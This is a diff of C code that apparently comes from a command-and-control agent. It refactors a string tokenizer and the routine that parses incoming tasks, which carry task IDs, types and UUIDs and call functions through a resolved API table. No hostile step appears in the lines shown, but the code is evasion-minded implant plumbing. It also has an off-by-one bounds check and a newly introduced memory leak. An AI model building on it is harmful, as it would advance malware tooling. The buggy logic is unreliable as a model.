@@ -123,7 +123,7 @@ Output:
 Note:
     The first token can be retrieved by using the `tokenizedString` member as a CHAR*
 
-    The rest of the tokens can be retrieved using the getNextToken function
+    The rest of the tokens can be retrieved using the getToken function
 
     // TODO: the final numberOfTokens value is not accurate if the last char 
     // or `delim` is not a null byte or if there are consecutive delimiters
@@ -159,7 +159,7 @@ Tokens myStrtok(PAPI api, CCHAR* str, CCHAR delim)
 }
 
 /*
-This function retrieves the next token in a Tokens struct
+This function retrieves a token in a Tokens struct
 
 Input:
     Tokens tokenizedStr: a `Tokens` struct obtained with myStrtok
@@ -167,16 +167,14 @@ Input:
     DWORD index: the index of the requested token
 
 Output:
-    Success -> CHAR*: a pointer to the next token
+    Success -> CHAR*: a pointer to the requested token
 
     Failure -> NULL
 
 Note:
-    the function should be run in a function that counts down the number of tokens
-
-    the `tokenizedString` member of `tokens` must not be freed before running the function
+    the `tokenizedString` member of `tokens` must not have been freed before running the function
 */
-CHAR* getNextToken(PAPI api, Tokens tokens, DWORD index)
+CHAR* getToken(PAPI api, Tokens tokens, DWORD index)
 {
     // return null if index is out of bounds
     if (index > tokens.numberOfTokens)
@@ -340,11 +338,11 @@ CHAR* myTrim(PAPI api, CCHAR* str, CHAR trim)
 CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** uuid)
 {
     CHAR* tmpJson = json;  // myStrtok modifies the string itself
-    ((PRINTF)api->printf)(json);
     CHAR* task;
     CHAR delim = { '\n' };
-    Tokens tokens = myStrtok(api, tmpJson, delim);
     CHAR blacklist[] = { '[', ']', '\0' };
+    // tokenize json
+    Tokens tokens = myStrtok(api, tmpJson, delim);
 
     // json is empty
     if (tokens.tokenizedString[0] == '[' && tokens.tokenizedString[1] == ']')
@@ -352,14 +350,16 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
         return NULL;
     }
 
+    #ifdef DEBUG
     char hi[] = { '%', 'd', 0 };
     ((PRINTF)api->printf)(hi, tokens.numberOfTokens);
+    #endif
+
     for (int index = 0; index < tokens.numberOfTokens; index++)
     {
-        ((PRINTF)api->printf)(getNextToken(api, tokens, index));
+        getToken(api, tokens, index);
+        //((PRINTF)api->printf)(getToken(api, tokens, index));
     }
-
-    ((FREE)api->free)(tokens.tokenizedString);
 
     /*
     // SKIP [ and ]
